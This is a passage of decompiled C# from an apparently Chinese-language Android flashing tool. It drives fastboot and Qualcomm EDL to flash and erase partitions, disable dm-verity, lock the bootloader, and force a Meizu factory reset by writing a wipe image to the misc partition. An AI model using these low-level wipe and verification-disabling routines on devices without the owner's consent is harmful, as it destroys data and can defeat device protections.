			string directoryName = Path.GetDirectoryName(text);
			string fileName = Path.GetFileName(text);
			((Control)this.m_11c).Text = Path.Combine(directoryName, "images");
			Msg("脚本:" + fileName + "\n");
			Msg("镜像目录:" + ((Control)this.m_11c).Text + "\n");
			string[] array = File.ReadAllLines(text);
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				if (text2.StartsWith("fastboot "))
				{
					string[] array3 = text2.Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
					int num2 = -1;
					for (int num3 = 1; num3 < array3.Length; num3++)
					{
						if (array3[num3] == "flash" || array3[num3] == "erase")
						{
							num2 = num3;
							break;
						}
					}
					if (num2 > 0 && num2 + 1 < array3.Length)
					{
						string text3 = array3[num2];
						string text4 = array3[num2 + 1];
						ListViewItem listViewItem = new ListViewItem(text4);
						listViewItem.Checked = true;
						int num4 = text2.IndexOf("%~dp0\\images");
						if (num4 == -1)
						{
							num4 = text2.IndexOf("%~dp0images");
						}
						if (num4 != -1)
						{
							string text5 = text2.Substring(num4 + "%~dp0\\images".Length);
							text5 = text5.TrimStart('\\', '/');
							text5 = text5.Split(' ', '\\', '/')[0];
							listViewItem.SubItems.Add(text5);
							string text6 = Path.Combine(((Control)this.m_11c).Text, text5);
							listViewItem.SubItems.Add(text6);
						}
						else
						{
							listViewItem.SubItems.Add("");
							listViewItem.SubItems.Add("");
						}
						listViewItem.SubItems.Add(text3);
						listViewItem.SubItems.Add("null");
						((ListView)this.m_111).Items.Add(listViewItem);
					}
				}
				if (text2.Contains("set_active a"))
				{
					((Checkbox)_11e).Checked = true;
				}
				
				if (text2.Contains("oem lock"))
				{
					((Checkbox)this.m_11f).Checked = true;
				}
				if (text2.Contains("oem cdms"))
				{
					((Checkbox)this.m_122).Checked = true;
				}
				if (text2.Contains("reboot"))
				{
					((Checkbox)this.m_11b).Checked = true;
				}
			}
		}
		if (list2.Count <= 0)
		{
			return;
		}
		foreach (string item in list2)
		{
			try
			{
				string directoryName2 = Path.GetDirectoryName(item);
				string fileName2 = Path.GetFileName(item);
				Msg("解析XML: ");
				fa();
				Msg(fileName2 + "\n");
				((Control)this.m_11c).Text = directoryName2;
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(item);
				XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("program");
				foreach (XmlNode item2 in elementsByTagName)
				{
					string text7 = item2.Attributes["label"]?.Value ?? "";
					string text8 = item2.Attributes["filename"]?.Value ?? "";
					string text9 = item2.Attributes["physical_partition_number"]?.Value ?? "";
					if (!string.IsNullOrEmpty(text7))
					{
						ListViewItem listViewItem2 = new ListViewItem(text7);
						if (text7 == "PrimaryGPT")
						{
							text8 = "gpt_both" + text9 + ".bin";
						}
						if (!string.IsNullOrEmpty(text8) && text7 != "BackupGPT")
						{
							listViewItem2.Checked = true;
						}
						listViewItem2.SubItems.Add(text8);
						string text10 = (string.IsNullOrEmpty(text8) ? "双击选择文件" : Path.Combine(directoryName2, text8));
						listViewItem2.SubItems.Add(text10);
						listViewItem2.SubItems.Add("flash");
						listViewItem2.SubItems.Add(text9);
						((ListView)this.m_111).Items.Add(listViewItem2);
					}
				}
			}
			catch (Exception ex)
			{
				Msg("解析 XML 出错: " + ex.Message + "\n");
			}
		}
	}

	private void _14c(object sender, object e)
	{
		if (!((Checkbox)this.m_120).Checked)
		{
			return;
		}
		foreach (ListViewItem item in ((ListView)this.m_111).Items)
		{
			if (item.SubItems[0].Text.Contains("userdata") || item.SubItems[0].Text.Contains("metadata"))
			{
				item.Checked = !((Checkbox)this.m_120).Checked;
			}
		}
	}

	private void _14d(object sender, BoolEventArgs e)
	{
	}

	private async void _14e(object sender, object e)
	{
		((System.Windows.Forms.Timer)this.m_39).Start();
		this.m_3a = (IntPtr)0;
		((Control)this.m_107).Text = $"耗时: {0} 分 {0} 秒";
		falseButtons();
		((Control)this.m_cf).Text = "";
		((Control)this.m_107).Text = "";
		((Control)this.m_cd).Text = "";
		if (((ListView)this.m_111).CheckedItems.Count == 0)
		{
			MessageBox.Show("请至少选择一个项。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			EnableButtons();
			return;
		}
		((UIProcessBar)this.m_c1).Maximum = ((ListView)this.m_111).CheckedItems.Count;
		((UIProcessBar)this.m_c1).Value = 0;
		object enumerator = ((ListView)this.m_111).CheckedItems.GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (ListViewItem)((IEnumerator)enumerator).Current;
				object obj2 = ((ListViewItem)obj).SubItems[0].Text;
				object text = ((ListViewItem)obj).SubItems[2].Text;
				object text2 = ((ListViewItem)obj).SubItems[1].Text;
				object text3 = ((ListViewItem)obj).SubItems[3].Text;
				object text4 = ((ListViewItem)obj).SubItems[4].Text;
				if ((string)obj2 == "PrimaryGPT")
				{
					obj2 = "partition:" + (string)text4;
				}
				object flashCommand;
				if (((string)text3).Contains("flash"))
				{
					if (!File.Exists((string)text))
					{
						msgred();
						Msg("[错误] " + (string)obj2 + " 分区文件不存在！\n");
						continue;
					}
					Msg("[Flashing] ");
					Msg((string)(text2 ?? ""));
					Msg("> " + (string)obj2 + "...");
					flashCommand = (string)obj2 + " " + (string)text;
				}
				else
				{
					if (!((string)text3).Contains("erase"))
					{
						Msg("未选择文件!无法进行刷机操作！\n");
						EnableButtons();
						return;
					}
					Msg("[Eraseing] ");
					Msg((string)obj2 + "...");
					flashCommand = obj2;
				}
				((Control)this.m_cf).Text = "";
				nint num = ((await _14f(flashCommand, text3)) ? 1 : 0);
				IntPtr intPtr = num;
				if ((int)(nint)intPtr != 0)
				{
					fa();
					Msg("OK\n");
					if (this.m_4c)
					{
						Log2("写入已取消\n", Color.Red, isBold: true);
						EnableButtons();
						return;
					}
					object obj3 = this.m_c1;
					int value = ((UIProcessBar)obj3).Value;
					((UIProcessBar)obj3).Value = value + 1;
				}
				else
				{
					msgred();
					Msg("Error\n");
					if (this.m_4c)
					{
						Log2("写入已取消\n", Color.Red, isBold: true);
						EnableButtons();
						return;
					}
					((UIProcessBar)this.m_c1).Value = 0;
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		((System.Windows.Forms.Timer)this.m_39).Stop();
		((Control)this.m_cf).Text = "刷写操作完成";
		EnableButtons();
		if (((Checkbox)this.m_122).Checked)
		{
			Msg("关闭DM验证...");
			nint num2 = ((await _150("oem cdms")) ? 1 : 0);
			IntPtr intPtr2 = num2;
			if ((int)(nint)intPtr2 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
		if (((Checkbox)_11e).Checked)
		{
			Msg("切换分区A...");
			nint num3 = ((await _150("set_active a")) ? 1 : 0);
			IntPtr intPtr3 = num3;
			if ((int)(nint)intPtr3 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
		if (((Checkbox)this.m_11f).Checked)
		{
			Msg("锁定Bootloader...");
			nint num4 = ((await _150("oem lock")) ? 1 : 0);
			IntPtr intPtr4 = num4;
			if ((int)(nint)intPtr4 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
		if (((Checkbox)this.m_11b).Checked)
		{
			Msg("重启设备...");
			nint num5 = ((await _150("reboot")) ? 1 : 0);
			IntPtr intPtr5 = num5;
			if ((int)(nint)intPtr5 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
	}

	private async Task<bool> _14f(object flashCommand, object OP)
	{
		object CS_0024_003C_003E8__locals10 = new _003C_003Ec__DisplayClass475_0();
		((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10).OP = (string)OP;
		((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10).flashCommand = (string)flashCommand;
		((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10)._003C_003E4__this = this;
		this.m_4c = false;
		nint num = ((await Task.Run(() =>
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "C:\\TMFTool\\fastboot.exe",
					Arguments = ((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10).OP + " " + ((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10).flashCommand,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = new Process
				{
					StartInfo = startInfo
				};
				_003C_003Ec__DisplayClass475_0 obj = (_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10;
				bool shouldDisplayOutput = ((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10).flashCommand.Contains("super") || ((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10).flashCommand.Contains("system") || ((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10).flashCommand.Contains("userdata");
				DataReceivedEventHandler value = (object sender, DataReceivedEventArgs e) =>
				{
					if (!string.IsNullOrEmpty(e.Data))
					{
						if (e.Data.StartsWith("Sending sparse"))
						{
							string pattern = "Sending sparse\\s+'(\\w+)'\\s+(\\d+/\\d+)\\s+\\(([\\d\\s]+) KB\\)";
							Match match = Regex.Match(e.Data, pattern);
							if (match.Success)
							{
								string value2 = match.Groups[1].Value;
								string value3 = match.Groups[2].Value;
								string value4 = match.Groups[3].Value;
								if (long.TryParse(value4.Trim(), out var result))
								{
									long num2 = (long)Math.Round((double)result / 1024.0);
									string displayText = $"刷写分段文件 sparse {value3} ({num2} MB)";
									if (((Control)obj._003C_003E4__this.m_cf).InvokeRequired)
									{
										((Control)obj._003C_003E4__this.m_cf).Invoke((Delegate)(Action)(() =>
										{
											((Control)obj._003C_003E4__this.m_cf).Text = displayText;
										}));
									}
									else
									{
										((Control)obj._003C_003E4__this.m_cf).Text = displayText;
									}
								}
							}
						}
						if (e.Data.Contains("FAILED"))
						{
							obj._003C_003E4__this.msgred();
							obj._003C_003E4__this.Msg(e.Data + "\n");
						}
						else if (!shouldDisplayOutput)
						{
						}
					}
				};
				process.OutputDataReceived += value;
				process.ErrorDataReceived += value;
				process.Start();
				process.BeginOutputReadLine();
				process.BeginErrorReadLine();
				process.WaitForExit();
				return process.ExitCode == 0;
			}
			catch (Exception ex)
			{
				((_003C_003Ec__DisplayClass475_0)CS_0024_003C_003E8__locals10)._003C_003E4__this.Msg("执行时出错: " + ex.Message);
				return false;
			}
		})) ? 1 : 0);
		return (byte)num != 0;
	}

	private async Task<bool> _150(object flashCommand)
	{
		object CS_0024_003C_003E8__locals6 = new _003C_003Ec__DisplayClass476_0();
		((_003C_003Ec__DisplayClass476_0)CS_0024_003C_003E8__locals6).flashCommand = (string)flashCommand;
		((_003C_003Ec__DisplayClass476_0)CS_0024_003C_003E8__locals6)._003C_003E4__this = this;
		nint num = ((await Task.Run(() =>
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "C:\\TMFTool\\fastboot.exe",
					Arguments = (((_003C_003Ec__DisplayClass476_0)CS_0024_003C_003E8__locals6).flashCommand ?? ""),
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				process.WaitForExit();
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				if (process.ExitCode != 0)
				{
					((_003C_003Ec__DisplayClass476_0)CS_0024_003C_003E8__locals6)._003C_003E4__this.msgred();
					((_003C_003Ec__DisplayClass476_0)CS_0024_003C_003E8__locals6)._003C_003E4__this.Msg(text2 ?? "");
				}
				return process.ExitCode == 0;
			}
			catch (Exception ex)
			{
				((_003C_003Ec__DisplayClass476_0)CS_0024_003C_003E8__locals6)._003C_003E4__this.Msg("执行时出错: " + ex.Message);
				return false;
			}
		})) ? 1 : 0);
		return (byte)num != 0;
	}

	private async Task<bool> _151(object flashCommand)
	{
		object CS_0024_003C_003E8__locals6 = new _003C_003Ec__DisplayClass477_0();
		((_003C_003Ec__DisplayClass477_0)CS_0024_003C_003E8__locals6).flashCommand = (string)flashCommand;
		((_003C_003Ec__DisplayClass477_0)CS_0024_003C_003E8__locals6)._003C_003E4__this = this;
		this.m_4c = false;
		nint num = ((await Task.Run(() =>
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "C:\\TMFTool\\fastboot.exe",
					Arguments = "erase " + ((_003C_003Ec__DisplayClass477_0)CS_0024_003C_003E8__locals6).flashCommand + "\"",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				process.WaitForExit();
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				if (process.ExitCode != 0)
				{
					((_003C_003Ec__DisplayClass477_0)CS_0024_003C_003E8__locals6)._003C_003E4__this.msgred();
					((_003C_003Ec__DisplayClass477_0)CS_0024_003C_003E8__locals6)._003C_003E4__this.Msg(text2 ?? "");
				}
				return process.ExitCode == 0;
			}
			catch (Exception ex)
			{
				((_003C_003Ec__DisplayClass477_0)CS_0024_003C_003E8__locals6)._003C_003E4__this.Msg("执行时出错: " + ex.Message);
				return false;
			}
		})) ? 1 : 0);
		return (byte)num != 0;
	}

	private void _152(object sender, object e)
	{
		bool flag = ((CheckBox)this.m_110).Checked;
		foreach (ListViewItem item in ((ListView)this.m_111).Items)
		{
			item.Checked = flag;
		}
	}

	private void _153(object sender, BoolEventArgs e)
	{
	}

	private void _154(object sender, BoolEventArgs e)
	{
	}

	private void _155(object sender, object e)
	{
		if (((Checkbox)this.m_12c).Checked)
		{
			ListViewItem listViewItem = ((ListView)this.m_111).Items[((ItemCheckEventArgs)e).Index];
			if (listViewItem.SubItems[0].Text.Contains("userdata") || listViewItem.SubItems[0].Text.Contains("metadata"))
			{
				((ItemCheckEventArgs)e).NewValue = CheckState.Unchecked;
			}
		}
		if (((Checkbox)this.m_121).Checked)
		{
			string[] source = new string[2] { "crclist", "sparsecrclist" };
			ListViewItem item = ((ListView)this.m_111).Items[((ItemCheckEventArgs)e).Index];
			if (source.Any((string s) => item.SubItems[0].Text.Contains(s)))
			{
				((ItemCheckEventArgs)e).NewValue = CheckState.Unchecked;
			}
		}
	}

	private void _156(object sender, object e)
	{
		foreach (ListViewItem item in ((ListView)this.m_111).Items)
		{
			if (item.SubItems[0].Text.Contains("sparsecrclist") || item.SubItems[0].Text.Contains("crclist"))
			{
				item.Checked = !((Checkbox)this.m_121).Checked;
			}
		}
	}

	private void _157(object sender, object e)
	{
		if (((Checkbox)this.m_11f).Checked)
		{
			((Checkbox)this.m_11b).Checked = false;
		}
	}

	private async void _158(object sender, object e)
	{
		Msg("识别槽位...");
		this.m_72 = "";
		nint num = ((await RunFastbootCommandAsync("getvar current-slot", 6)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			msgred();
			Msg("未知\n");
		}
		else
		{
			if (string.IsNullOrEmpty((string)this.m_72))
			{
				return;
			}
			object obj = Regex.Match((string)this.m_72, "current-slot:\\s*(\\S+)");
			if (!((Group)obj).Success)
			{
				Msg("未知\n");
				return;
			}
			object value = ((Match)obj).Groups[1].Value;
			Msg((string)value + "\n");
			value = ((!((string)value == "a")) ? "a" : "b");
			Msg("切换槽位" + (string)value + "...");
			nint num2 = ((await RunFastbootCommandAsync("set_active " + (string)value, 6)) ? 1 : 0);
			IntPtr intPtr2 = num2;
			if (intPtr2 == (IntPtr)0)
			{
				msgred();
				Msg("Error\n");
			}
			else
			{
				fa();
				Msg("OK\n");
			}
		}
	}

	private async void _159(object sender, object e)
	{
	}

	private void _15a(object sender, object e)
	{
		if (((ListView)this.m_111).SelectedItems.Count <= 0)
		{
			return;
		}
		ListViewItem listViewItem = ((ListView)this.m_111).SelectedItems[0];
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "IMG files (*.img)|*.img|All files (*.*)|*.*";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string fileName = Path.GetFileName(openFileDialog.FileName);
			string fileName2 = openFileDialog.FileName;
			listViewItem.SubItems[1].Text = fileName;
			listViewItem.SubItems[2].Text = fileName2;
			listViewItem.SubItems[3].Text = "flash";
			((ListView)this.m_111).SelectedItems[0].Checked = true;
		}
	}

	private void _15b(object sender, object e)
	{
		string value = ((Control)this.m_11a).Text.Trim();
		((UIComboBox)this.m_11a).Items.Clear();
		if (!string.IsNullOrEmpty(value))
		{
			HashSet<string> hashSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
			foreach (ListViewItem item in ((ListView)this.m_111).Items)
			{
				string text = item.SubItems[0].Text;
				if (text.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0 && !hashSet.Contains(text))
				{
					((UIComboBox)this.m_11a).Items.Add(text);
					hashSet.Add(text);
				}
			}
		}
		((UIDropControl)this.m_11a).SelectionStart = ((Control)this.m_11a).Text.Length;
		((UIDropControl)this.m_11a).SelectionLength = 0;
	}

	private void _15c(object sender, object e)
	{
		string value = ((Control)this.m_11a).Text?.Trim();
		foreach (ListViewItem item in ((ListView)this.m_111).Items)
		{
			item.Selected = false;
			item.BackColor = ((Control)this.m_111).BackColor;
		}
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		foreach (ListViewItem item2 in ((ListView)this.m_111).Items)
		{
			if (item2.SubItems[0].Text.Equals(value, StringComparison.OrdinalIgnoreCase))
			{
				item2.Selected = true;
				item2.BackColor = Color.LightBlue;
				item2.Focused = true;
				((Control)this.m_111).Focus();
				item2.EnsureVisible();
				break;
			}
		}
	}

	private void _15d(object sender, object e)
	{
		if (((KeyEventArgs)e).KeyCode != Keys.Return)
		{
			return;
		}
		string value = ((Control)this.m_11a).Text.Trim();
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		foreach (ListViewItem item in ((ListView)this.m_111).Items)
		{
			if (item.SubItems[0].Text.Equals(value, StringComparison.OrdinalIgnoreCase))
			{
				item.Selected = true;
				item.BackColor = Color.LightBlue;
				item.Focused = true;
				((Control)this.m_111).Focus();
				item.EnsureVisible();
				break;
			}
		}
	}

	private void _15e(object sender, EventArgs e)
	{
	}

	private void _15f(object sender, EventArgs e)
	{
	}

	public string[] SearchFiles(string destinationDic, string pattern)
	{
		List<string> list = new List<string>();
		FileInfo[] files = new DirectoryInfo(destinationDic).GetFiles();
		Regex regex = new Regex(pattern, RegexOptions.IgnoreCase);
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			if (regex.IsMatch(fileInfo.Name))
			{
				list.Add(fileInfo.FullName);
			}
		}
		list.Sort((string a, string b) =>
		{
			bool flag = Path.GetFileName(a).ToLower().Contains("xbl");
			bool flag2 = Path.GetFileName(b).ToLower().Contains("xbl");
			if (flag && !flag2)
			{
				return -1;
			}
			return (!flag & flag2) ? 1 : 0;
		});
		return list.ToArray();
	}

	private async Task<bool> _161(object swPath)
	{
		nint num = 0;
		object obj = SearchFiles((string)swPath, SoftwareImage.ProgrammerPattern);
		object obj2 = SearchFiles((string)swPath, SoftwareImage.RawProgramPattern);
		object obj3 = SearchFiles((string)swPath, SoftwareImage.PatchPattern);
		if (((Array)obj2).Length != 0)
		{
			object obj4 = obj2;
			nint num2 = 0;
			while (num2 < ((Array)obj4).Length)
			{
				_ = ((object[])obj4)[num2];
				WriteData.rawXMLList = (string[])obj2;
				WriteData.rawXMLList = (string[])obj3;
				num = 1;
				nint num3 = num2 + 1;
				num2 = num3;
			}
		}
		else
		{
			msgred();
			Msg("Rawprogram 文件无效！");
			num = 0;
		}
		if (((Array)obj3).Length != 0)
		{
			WriteData.patchXMLList = (string[])obj3;
		}
		if (((Array)obj).Length != 0)
		{
			object obj5 = obj;
			nint num4 = 0;
			while (num4 < ((Array)obj5).Length)
			{
				_ = ((object[])obj5)[num4];
				WriteData.Firehose_Programmer = (string)((object[])obj)[0];
				nint num5 = num4 + 1;
				num4 = num5;
			}
		}
		else
		{
			num = 1;
		}
		return (byte)num != 0;
	}

	private async void _162(object sender, object e)
	{
		object text = ((Control)this.m_c5).Text;
		if (string.IsNullOrWhiteSpace((string)text) || !Directory.Exists((string)text))
		{
			return;
		}
		try
		{
			((Collection<RawPartition>)_41).Clear();
			_ = ((await _161(text)) ? 1 : 0);
			if (((UIComboBox)this.m_10a).SelectedItem != null && ((UIComboBox)this.m_10a).SelectedItem.ToString() == "官方:高通骁龙芯片（Qualcomm XiaoLong EDL ELF）")
			{
				((Control)this.m_c3).Text = WriteData.Firehose_Programmer;
				object fileName = Path.GetFileName(WriteData.Firehose_Programmer);
				Msg("自动识别引导: ");
				Msg((string)fileName + "\n");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("Error occurred: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void _163(object sender, GiveFeedbackEventArgs e)
	{
	}

	private void _164(object sender, object e)
	{
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_143).Rows)
		{
			if (!item.IsNewRow)
			{
				string text = item.Cells["name"].Value?.ToString().ToLower();
				if (text.Contains("userdata") || text.Contains("metadata"))
				{
					item.Cells["Check"].Value = !((Checkbox)this.m_12c).Checked;
				}
			}
		}
	}

	private void _165(object sender, object e)
	{
		string[] source = new string[8] { "modemst1", "modemst2", "fsg", "fsc", "mdm1m9kefs3", "mdm1m9kefs1", "mdm1m9kefs2", "mdm1m9kefsc" };
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_143).Rows)
		{
			if (!item.IsNewRow)
			{
				string value = item.Cells["name"].Value?.ToString();
				if (source.Contains(value))
				{
					item.Cells["Check"].Value = !((Checkbox)this.m_12d).Checked;
				}
			}
		}
		if (!((Checkbox)this.m_12d).Checked)
		{
			msgred();
			Msg("已取消基带分区保护!\n");
		}
		else
		{
			fb();
			Msg("开启基带保护!\n");
		}
	}

	private async void _166(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			await Task.Delay(500);
			nint num3 = 0;
			object obj = "C:\\TMFTool";
			object file = Path.Combine((string)obj, "misc.img");
			object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj2 = (DataGridViewRow)((IEnumerator)enumerator).Current;
					if (((DataGridViewRow)obj2).IsNewRow)
					{
						continue;
					}
					object obj3 = ((DataGridViewRow)obj2).Cells["name"].Value?.ToString();
					if (string.IsNullOrEmpty((string)obj3) || !((string)obj3).Contains("misc"))
					{
						continue;
					}
					num3 = 1;
					object obj4 = new FileStream((string)file, FileMode.Create, FileAccess.Write);
					try
					{
						object misc_wipedata_meizu = Resources.misc_wipedata_meizu;
						((Stream)obj4).Write((byte[])misc_wipedata_meizu, 0, ((Array)misc_wipedata_meizu).Length);
					}
					finally
					{
						((IDisposable)obj4)?.Dispose();
					}
					((List<RawPartition>)this.m_3e).Clear();
					object numsector = ((DataGridViewRow)obj2).Cells["num"].Value?.ToString();
					object start = ((DataGridViewRow)obj2).Cells["star"].Value?.ToString();
					object physicalNum = ((DataGridViewRow)obj2).Cells["L"].Value?.ToString();
					object sectorSize = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
					((List<RawPartition>)this.m_3e).Add(new RawPartition((string)obj3, (string)file, "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
					try
					{
						nint num4 = ((await Task.Run(() => b8())) ? 1 : 0);
						IntPtr intPtr2 = num4;
						if ((int)(nint)intPtr2 != 0)
						{
							OpenDisk(PortQcom);
							Log2("魅族恢复出厂...", Color.Black, isBold: false, newline: true);
							_56();
							((Checkbox)this.m_109).Checked = false;
							Log2("OK", Color.DodgerBlue, isBold: false);
							Log2("", Color.DodgerBlue, isBold: false, newline: true);
							((Control)this.m_cf).Text = "恢复出厂完成";
							DiskClose();
							bb(obj);
							break;
						}
						return;
					}
					catch (Exception ex)
					{
						MessageBox.Show("发生了一个错误: " + ex.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					break;
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if (num3 == 0)
			{
				bc("请先阅览分区或选择XML解析分区表", Color.Red);
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private void _167(object sender, object e)
	{
		string value = ((Control)this.m_d8).Text?.Trim();
		foreach (ListViewItem item in ((ListView)this.m_d0).Items)
		{
			item.Selected = false;
			item.BackColor = ((Control)this.m_d0).BackColor;
		}
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		foreach (ListViewItem item2 in ((ListView)this.m_d0).Items)
		{
			if (item2.SubItems[0].Text.Equals(value, StringComparison.OrdinalIgnoreCase))
			{
				item2.Selected = true;
				item2.BackColor = Color.LightBlue;
				item2.Focused = true;
				((Control)this.m_d0).Focus();
				item2.EnsureVisible();
				break;
			}
		}
	}

	private async void _168(object sender, object e)
	{
		object obj = new OpenFileDialog();
		try
		{
			object obj2 = new _003C_003Ec__DisplayClass501_0();
			((_003C_003Ec__DisplayClass501_0)obj2)._003C_003E4__this = this;
			((FileDialog)obj).Title = "选择 payload.bin 文件";
			((FileDialog)obj).Filter = "Payload 文件 (*.bin)|*.bin";
			((OpenFileDialog)obj).Multiselect = false;
			if (((CommonDialog)obj).ShowDialog() != DialogResult.OK)
			{
				((Payload)this.m_7f)?.Dispose();
				this.m_7f = null;
				Msg("已解除Payload占用!\n");
				((DataGridView)this.m_16e).Rows.Clear();
				((Control)this.m_135).Text = "";
				((CheckBox)this.m_173).Checked = false;
				return;
			}
			if (!((Checkbox)this.m_16d).Checked)
			{
				DialogResult dialogResult = MessageBox.Show("是否进行校验文件完整性(校验将降低解包速度用于计算!)", "校验询问", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
				if (dialogResult == DialogResult.Yes)
				{
					((Checkbox)this.m_16d).Checked = true;
				}
			}
			((_003C_003Ec__DisplayClass501_0)obj2).filePath = ((FileDialog)obj).FileName;
			((Control)this.m_135).Text = ((_003C_003Ec__DisplayClass501_0)obj2).filePath;
			object tmpdir = Path.Combine(Path.GetTempPath(), "payload_temp");
			if (Directory.Exists((string)tmpdir))
			{
				try
				{
					Directory.Delete((string)tmpdir, recursive: true);
				}
				catch
				{
				}
			}
			Directory.CreateDirectory((string)tmpdir);
			((Payload)this.m_7f)?.Dispose();
			this.m_7f = null;
			((DataGridView)this.m_16e).Rows.Clear();
			try
			{
				Msg("正在加载文件: " + ((_003C_003Ec__DisplayClass501_0)obj2).filePath + "\n");
				object obj4 = Path.Combine(Path.GetDirectoryName(((_003C_003Ec__DisplayClass501_0)obj2).filePath) ?? "", "payload_properties.txt");
				object obj5 = null;
				object obj6 = new Dictionary<string, string>
				{
					{ "android_version", "Android 版本" },
					{ "forbid_ota_local_update", "禁止本地 OTA 更新" },
					{ "ota_root_or_debug", "OTA root/debug" },
					{ "oplus_update_engine_verify_disable", "禁用 Oplus 更新引擎验证" },
					{ "ota_target_version", "OTA 目标版本" },
					{ "oplus_rom_version", "Oplus ROM 版本" },
					{ "security_patch", "安全补丁日期" },
					{ "security_patch_vendor", "厂商安全补丁日期" },
					{ "oplus_separate_soft", "Oplus 分离软件版本" }
				};
				if (File.Exists((string)obj4))
				{
					object obj7 = File.ReadAllLines((string)obj4);
					for (nint num = 0; num < ((Array)obj7).Length; num++)
					{
						object obj8 = ((object[])obj7)[num];
						if (!string.IsNullOrWhiteSpace((string)obj8) && ((string)obj8).Contains("="))
						{
							object obj9 = ((string)obj8).Split(new char[1] { '=' }, 2);
							object obj10 = ((string)((object[])obj9)[0]).Trim();
							object obj11 = ((((Array)obj9).Length > 1) ? ((string)((object[])obj9)[1]).Trim() : "");
							if ((string)obj10 == "FILE_HASH")
							{
								obj5 = obj11;
							}
							string value;
							if (((Dictionary<string, string>)obj6).TryGetValue((string)obj10, out value))
							{
								Msg("  " + (string)value + ":");
								fa();
								Msg((string)obj11 + "\n");
							}
							value = null;
						}
					}
				}
				else
				{
					Msg("未找到有效Payload 信息\n");
				}
				if (((Checkbox)this.m_16d).Checked && !string.IsNullOrEmpty((string)obj5))
				{
					object CS_0024_003C_003E8__locals14 = new _003C_003Ec__DisplayClass501_1();
					((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass501_0)obj2;
					Msg("校验 " + Path.GetFileName(((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1.filePath) + " SHA256...");
					object obj12 = new FileInfo(((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1.filePath);
					((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).totalBytes = ((FileInfo)obj12).Length;
					((_003C_003Ec__DisplayClass501_1)CS_0024_003C_003E8__locals14).readBytes = 0L;
					((UIProcessBar)this.m_c1).Value = 0;
					((UIProcessBar)this.m_c1).Maximum = 10000;
					object obj13 = await Task.Run(() =>
					{
